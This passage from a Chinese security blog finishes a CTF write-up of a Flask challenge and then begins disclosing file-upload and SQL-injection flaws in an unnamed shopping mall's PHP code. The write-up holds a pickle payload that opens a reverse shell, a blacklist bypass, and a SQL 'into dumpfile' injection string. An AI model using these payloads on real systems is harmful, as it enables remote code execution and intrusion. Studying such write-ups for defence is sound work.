<p>测试反序列化漏洞(exp5.py):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="keyword">from</span> io <span class="keyword">import</span> open <span class="keyword">as</span> Open </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">LOAD</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div><div class="line"></div><div class="line"><span class="keyword">with</span> Open(<span class="string">"test"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">	LOAD(f)</div></pre></td></tr></table></figure></p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210716-71472a80-302d-1.jpeg" alt="unseri.jpg"></p>
<p>不过没那么简单，源码还设置了沙箱/黑名单来防止某些函数的执行，比如前面的os.system就被禁用了，我们修改exp5.py为进一步的测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> io <span class="keyword">import</span> open <span class="keyword">as</span> Open </div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Pickler <span class="keyword">as</span> Pkler</div><div class="line"></div><div class="line">black_type_list = [eval, execfile, compile, system, open, file, popen, popen2, popen3, popen4, fdopen,</div><div class="line">                   tmpfile, fchmod, fchown, pipe, chdir, fchdir, chroot, chmod, chown, link,</div><div class="line">                   lchown, listdir, lstat, mkfifo, mknod, mkdir, makedirs, readlink, remove, removedirs,</div><div class="line">                   rename, renames, rmdir, tempnam, tmpnam, unlink, walk, execl, execle, execlp, execv,</div><div class="line">                   execve, execvp, execvpe, exit, fork, forkpty, kill, nice, spawnl, spawnle, spawnlp, spawnlpe,</div><div class="line">                   spawnv, spawnve, spawnvp, spawnvpe, load, loads]</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FilterException</span><span class="params">(Exception)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, value)</span>:</span></div><div class="line">        super(FilterException, self).__init__(</div><div class="line">            <span class="string">'the callable object &#123;value&#125; is not allowed'</span>.format(value=str(value)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_call</span><span class="params">(func)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args, **kwargs)</span>:</span></div><div class="line">        <span class="keyword">print</span> args[<span class="number">0</span>].stack</div><div class="line">        <span class="keyword">if</span> args[<span class="number">0</span>].stack[<span class="number">-2</span>] <span class="keyword">in</span> black_type_list:</div><div class="line">            <span class="keyword">raise</span> FilterException(args[<span class="number">0</span>].stack[<span class="number">-2</span>])</div><div class="line">        <span class="keyword">return</span> func(*args, **kwargs)</div><div class="line">    <span class="keyword">return</span> wrapper</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">LOAD</span><span class="params">(file)</span>:</span></div><div class="line">    unpkler = Unpkler(file)</div><div class="line">    unpkler.dispatch[REDUCE] = _hook_call(unpkler.dispatch[REDUCE])</div><div class="line">    <span class="keyword">return</span> Unpkler(file).load()</div><div class="line"></div><div class="line"><span class="keyword">with</span> Open(<span class="string">"test"</span>,<span class="string">"rb"</span>) <span class="keyword">as</span> f:</div><div class="line">	LOAD(f)</div></pre></td></tr></table></figure></p>
<p>此时如果简单地想通过前一步生成的test来执行系统命令，会报错。</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210703-699fb630-302d-1.jpeg" alt="notallow.jpg"></p>
<p>考虑其他方法。python中除了os和sys模块有提供命令执行的函数外，还有其他第三方模块，比如commands模块：</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210611-4aa7837a-302d-1.jpeg" alt="commands.jpg"></p>
<p>因此改写生成序列化文件的exp4.py如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Unpickler <span class="keyword">as</span> Unpkler</div><div class="line"><span class="keyword">from</span> pickle <span class="keyword">import</span> Pickler <span class="keyword">as</span> Pkler</div><div class="line"><span class="keyword">import</span> commands</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">chybeta</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> (commands.getoutput,(<span class="string">"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span>,))    </div><div class="line">evil = chybeta()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(file)</span>:</span></div><div class="line">	pkler = Pkler(file)</div><div class="line">	pkler.dump(evil)</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">"test"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">	dump(f)</div></pre></td></tr></table></figure></p>
<p>同时为了进一步利用，我们尝试反弹shell。过程如下，先运行exp4.py生成新的test序列化文件，接着nc监听本地端口，接着运行exp5.py触发序列化漏洞并完成利用</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210651-62471a68-302d-1.jpeg" alt="local_shell.jpg"></p>
<p>不过该怎么控制源代码中的<code>load(file)</code>的file呢？通过全局搜索关键字，在<code>Mycache.py</code>的<code>FileSystemCache类</code>中有多次引用，比如定义在第137行的get方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, key)</span>:</span></div><div class="line">        filename = self._get_filename(key)</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            <span class="keyword">with</span> open(filename, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</div><div class="line">                pickle_time = load(f)</div><div class="line">                <span class="keyword">if</span> pickle_time == <span class="number">0</span> <span class="keyword">or</span> pickle_time &gt;= time():</div><div class="line">                    a = load(f)</div><div class="line">                    <span class="keyword">return</span> a</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    os.remove(filename)</div><div class="line">                    <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        <span class="keyword">except</span> (IOError, OSError, PickleError):</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">```            </div><div class="line">跟入`_get_filename`方法：</div><div class="line">```python</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_filename</span><span class="params">(self, key)</span>:</span></div><div class="line">    <span class="keyword">if</span> isinstance(key, text_type):</div><div class="line">        key = key.encode(<span class="string">'utf-8'</span>)  <span class="comment"># XXX unicode review</span></div><div class="line">    hash = md5(key).hexdigest()</div><div class="line">    <span class="keyword">return</span> os.path.join(self._path, hash)</div></pre></td></tr></table></figure></p>
<p>可以看到将传入的字符串key进行MD5，并将其返回。不过这个<code>key</code>在哪里定义？通过全局搜索，不难发现在<code>Mysession.py</code>的<code>open_session</code>中进行了调用：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileSystemSessionInterface</span><span class="params">(SessionInterface)</span>:</span></div><div class="line">    ...</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, cache_dir, threshold, mode, key_prefix=<span class="string">"bdwsessions"</span>,</span></span></div><div class="line">                 use_signer=False, permanent=True):</div><div class="line"></div><div class="line">        self.cache = FileSystemCache(cache_dir, threshold=threshold, mode=mode)</div><div class="line">        self.key_prefix = key_prefix</div><div class="line">        self.use_signer = use_signer</div><div class="line">        self.permanent = permanent</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></div><div class="line">        <span class="comment"># 从cookie中获取到sid</span></div><div class="line">        <span class="comment"># 格式 Cookie: session=675b6ec7-95bd-411f-a59d-4c3db5929604</span></div><div class="line">        <span class="comment"># sid 即为 675b6ec7-95bd-411f-a59d-4c3db5929604</span></div><div class="line">        sid = request.cookies.get(app.session_cookie_name)</div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sid:</div><div class="line">            sid = self._generate_sid()</div><div class="line">            <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</div><div class="line">        ...</div><div class="line">        data = self.cache.get(self.key_prefix + sid)</div><div class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">return</span> self.session_class(data, sid=sid)</div><div class="line">        <span class="keyword">return</span> self.session_class(sid=sid, permanent=self.permanent)</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>其中<code>self.key_prefix</code>即为<code>bdwsessions</code>，因此假设cookie中的sesssion值为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，则<code>self.key_prefix + sid</code>即为<code>bdwsessions675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，然后这串字符串进行MD5得到的结果<code>78f634977cbacf167dfd9656fe9dd5f3</code>即为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>对应的session文件名。</p>
<p>同时根据<code>config.py</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"mysql://root:password@localhost/flask?charset=utf8"</span></div><div class="line">SESSION_FILE_DIR = <span class="string">"/tmp/ffff"</span></div></pre></td></tr></table></figure></p>
<p>可以知道session文件的保存路径在<code>/tmp/ffff</code>，以及用户为root，因此具有文件导出的权限的可能性很大。</p>
<h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><p>结合<code>Python is the best language 1</code>中的sql注入漏洞，我们梳理出如下的攻击流程：</p>
<ol>
<li>本地生成序列化文件，并且进行十六进制编码</li>
<li>通过sql注入漏洞outfile出session文件</li>
<li>访问index，同时带上session文件对应的session值，触发<code>open_session</code>中的<code>self.cache.get</code>，进行反序列化攻击</li>
</ol>
<p>假设前面生成的序列化文件存在于<code>/tmp/ffff/chybeta</code>，建议使用mysql的hex转码来进行十六进制的转换:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select hex(load_file('/tmp/ffff/chybeta')) into outfile '/tmp/ffff/exp';</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure></p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210627-54001108-302d-1.jpeg" alt="exp.jpg"></p>
<p>以使用<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>作为cookie为例，则其session文件存在于<code>/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3</code></p>
<p>在十六进制的序列化串前面添加<code>0x</code>，构造邮箱处的注入点：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> email = <span class="string">'test'</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">0x63636F6D6D616E64730A</span>..<span class="comment">/**/</span><span class="keyword">into</span><span class="comment">/**/</span><span class="keyword">dumpfile</span><span class="comment">/**/</span><span class="string">'/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3'</span>#@test.com<span class="string">'</span></div></pre></td></tr></table></figure></p>
<p>也即在注册的邮箱处填入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">test&apos;/**/union/**/select/**/0x63636F6D6D616E64730A.../**/into/**/dumpfile/**/&apos;/tmp/ffff/78f634977cbacf167dfd9656fe9dd5f3&apos;#@test.com</div></pre></td></tr></table></figure></p>
<p>点击submit后出现<code>Please use a different email address.</code>。</p>
<p>接着在burp中抓取访问index的包，并修改cookie为<code>675b6ec7-95bd-411f-a59d-4c3dbchybeta</code>，在自己的vps上监听对应的端口：</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180325210556-416f6304-302d-1.jpeg" alt="chybeta.jpg"></p>
<p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">QWB&#123;pyth0n1s1ntere3t1ng&#125;</div></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li>wtforms.validators的Email类验证不完善</li>
<li>flask的session处理机制</li>
<li>python沙箱逃逸</li>
<li>python反序列化漏洞</li>
<li>一点“小小”的脑洞</li>
</ul>
<h1 id="Refference"><a href="#Refference" class="headerlink" title="Refference"></a>Refference</h1><ul>
<li><a href="http://bugs.leavesongs.com/PYTHON/Python%E5%BA%93WTForm%E8%BF%87%E6%BB%A4%E4%B8%8D%E4%B8%A5%E5%AF%BC%E8%87%B4URLXSS%E6%BC%8F%E6%B4%9E/" target="_blank" rel="external">P师傅：Python库WTForm过滤不严导致URLXSS漏洞</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xianzhi.aliyun.com/forum/topic/2219&quot;&gt;强网杯：Python is the best language-writeup&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
      <category term="flask" scheme="http://chybeta.github.io/tags/flask/"/>
    
  </entry>
  
  <entry>
    <title>某商城文件上传漏洞与SQL注入漏洞</title>
    <link href="http://chybeta.github.io/2018/03/21/%E6%9F%90%E5%95%86%E5%9F%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E4%B8%8ESQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://chybeta.github.io/2018/03/21/某商城文件上传漏洞与SQL注入漏洞/</id>
    <published>2018-03-21T04:32:59.000Z</published>
    <updated>2018-03-23T08:16:28.363Z</updated>
    
    <content type="html"><![CDATA[<p>首发于：<a href="https://xianzhi.aliyun.com/forum/topic/2203" target="_blank" rel="external">先知社区: 某商城文件上传漏洞与SQL注入漏洞</a><br><a id="more"></a></p>
<h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h1><p>定位到Application/Home/Controller/AppUploadController.class.php：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</div><div class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">AppUploadController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">commentUpload</span><span class="params">()</span></span>&#123;</div><div class="line">        $user_id=$_POST[<span class="string">'user_id'</span>];</div><div class="line">        $goods_id=$_POST[<span class="string">'goods_id'</span>];</div><div class="line">        $order_id=$_POST[<span class="string">'order_id'</span>];</div><div class="line">        <span class="keyword">if</span>($_FILES) &#123;</div><div class="line">            $filename = $_FILES[<span class="string">'img'</span>][<span class="string">'name'</span>];</div><div class="line">            $tmpname = $_FILES[<span class="string">'img'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($tmpname, <span class="string">'./Uploads/show/'</span> . $filename)) &#123;</div><div class="line">                $path[<span class="string">'path'</span>]=<span class="string">'/Uploads/show/'</span> . $filename;</div><div class="line">                $path[<span class="string">'create_time'</span>]=time();</div><div class="line">                $r=M(<span class="string">'images'</span>)-&gt;add($path);</div><div class="line">                $show_pic=M(<span class="string">'order_comment'</span>)-&gt;where([</div><div class="line">                    <span class="string">'goods_id'</span>=&gt;$goods_id</div><div class="line">                ])-&gt;getField(<span class="string">'show_pic'</span>);</div><div class="line">                <span class="keyword">if</span>(!<span class="keyword">empty</span>($show_pic)) &#123;</div><div class="line">                    $show[<span class="string">'show_pic'</span>] = $show_pic . <span class="string">','</span> . $r;</div><div class="line">                    M(<span class="string">'order_comment'</span>)-&gt;where([</div><div class="line">                        <span class="string">'goods_id'</span> =&gt; $goods_id,</div><div class="line">                        <span class="string">'order_id'</span>=&gt;$order_id,</div><div class="line">                        <span class="string">'user_id'</span>=&gt;$user_id</div><div class="line">                    ])-&gt;save($show);</div><div class="line">                &#125;<span class="keyword">else</span>&#123;</div><div class="line">                    $show[<span class="string">'show_pic'</span>] = $r;</div><div class="line">                    M(<span class="string">'order_comment'</span>)-&gt;where([</div><div class="line">                        <span class="string">'goods_id'</span> =&gt; $goods_id,</div><div class="line">                        <span class="string">'order_id'</span>=&gt;$order_id,</div><div class="line">                        <span class="string">'user_id'</span>=&gt;$user_id</div><div class="line">                    ])-&gt;save($show);</div><div class="line">                &#125;</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $data = json_encode($_FILES);</div><div class="line">                <span class="keyword">echo</span> $data;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">headerUpload</span><span class="params">()</span></span>&#123;</div><div class="line">        $user_id=$_POST[<span class="string">'user_id'</span>];</div><div class="line">        <span class="keyword">if</span>($_FILES) &#123;</div><div class="line">            $filename = $_FILES[<span class="string">'img'</span>][<span class="string">'name'</span>];</div><div class="line">            $tmpname = $_FILES[<span class="string">'img'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">            <span class="keyword">if</span> (move_uploaded_file($tmpname,<span class="string">'./Uploads/header/'</span> . $filename)) &#123;</div><div class="line">                $head_img[<span class="string">'user_header'</span>]=<span class="string">'/Uploads/header/'</span> . $filename;</div><div class="line">                $head_img[<span class="string">'user_id'</span>]=$user_id;</div><div class="line">                $find = M(<span class="string">'user_header'</span>)-&gt;where(<span class="keyword">array</span>(<span class="string">'user_id'</span> =&gt; $user_id))-&gt;find();</div><div class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>($find)) &#123;<span class="comment">//则数据库里已存在头像</span></div><div class="line">                    M(<span class="string">'user_header'</span>)-&gt;where(<span class="string">'user_id=%s'</span>,$user_id)-&gt;save($head_img);</div><div class="line">                &#125; <span class="keyword">else</span> &#123;<span class="comment">//数据库里不存在头像</span></div><div class="line">                    M(<span class="string">'user_header'</span>)-&gt;add($head_img);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">echo</span> json_encode(<span class="string">'上传成功'</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $data = json_encode($_FILES);</div><div class="line">                <span class="keyword">echo</span> $data;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>接受到文件后，没有过滤的直接进行了<code>move_uploaded_file</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">public function commentUpload()&#123;</div><div class="line">    ...</div><div class="line">    $filename = $_FILES[&apos;img&apos;][&apos;name&apos;];</div><div class="line">    $tmpname = $_FILES[&apos;img&apos;][&apos;tmp_name&apos;];</div><div class="line">    if (move_uploaded_file($tmpname, &apos;./Uploads/show/&apos; . $filename))</div><div class="line">    ...</div><div class="line">&#125;</div><div class="line"></div><div class="line">public function headerUpload()&#123;</div><div class="line">    ...</div><div class="line">    $filename = $_FILES[&apos;img&apos;][&apos;name&apos;];</div><div class="line">    $tmpname = $_FILES[&apos;img&apos;][&apos;tmp_name&apos;];</div><div class="line">    if (move_uploaded_file($tmpname,&apos;./Uploads/header/&apos; . $filename))</div><div class="line">    ...</div></pre></td></tr></table></figure></p>
<p>因此直接构造表单，以<code>commentUpload</code>为例:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1/index.php/Home/AppUpload/commentUpload"</span> <span class="attr">method</span>=<span class="string">"post"</span></span></div><div class="line"><span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"img"</span> <span class="attr">id</span>=<span class="string">"file"</span> /&gt;</span> </div><div class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>直接上传phpinfo.php，之后访问 <a href="http://127.0.0.1/Uploads/show/phpinfo.php" target="_blank" rel="external">http://127.0.0.1/Uploads/show/phpinfo.php</a></p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321203715-95f4b6da-2d04-1.jpeg" alt="6.jpg"><br>官网demo</p>
<h1 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h1><p>观察一下上面代码中的sql查询语句，在headerUpload函数中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">headerUpload</span><span class="params">()</span></span>&#123;</div><div class="line">    $user_id=$_POST[<span class="string">'user_id'</span>];</div><div class="line">    <span class="keyword">if</span>($_FILES) &#123;</div><div class="line">        ...</div><div class="line">        <span class="keyword">if</span> (move_uploaded_file($tmpname,<span class="string">'./Uploads/header/'</span> . $filename)) &#123;</div><div class="line">            ...</div><div class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>($find)) &#123;<span class="comment">//则数据库里已存在头像</span></div><div class="line">                M(<span class="string">'user_header'</span>)-&gt;where(<span class="string">'user_id=%s'</span>,$user_id)-&gt;save($head_img);</div><div class="line">            &#125; </div><div class="line">            ...</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>首先<code>user_id</code>是可控的。我们跟进tp的<code>where</code>方法，定义在 Core/Library/Think/Model.class.php:1783<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($where,$parse=null)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(!is_null($parse) &amp;&amp; is_string($where)) &#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($parse)) &#123;</div><div class="line">            $parse = func_get_args();</div><div class="line">            array_shift($parse);</div><div class="line">        &#125;</div><div class="line">        $parse = array_map(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;db,<span class="string">'escapeString'</span>),$parse);</div><div class="line">        $where =   vsprintf($where,$parse);</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>此时传入的参数<code>parse</code>即可控的<code>$user_id</code>，然后通过<code>vsprintf($where,$parse)</code>将其格式化输出到where语句中。这里并没有严格的对数据类型进行检验，虽然前面存在<code>escapeString</code>的过滤，但只要不引入引号即可。</p>
<p>要进入该if判断中，需要满足<code>!empty($find)</code>，也即数据库里已存在头像。因此可以先前台注册一个用户，登陆后在cookie字段获取到对应的user_id，如图所示user_id=275。</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194504-4c075dfe-2cfd-1.jpeg" alt="2.jpg"></p>
<p>在个人资料处先上传一张头像</p>
<p><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180321194527-59508472-2cfd-1.jpeg" alt="3.jpg"></p>
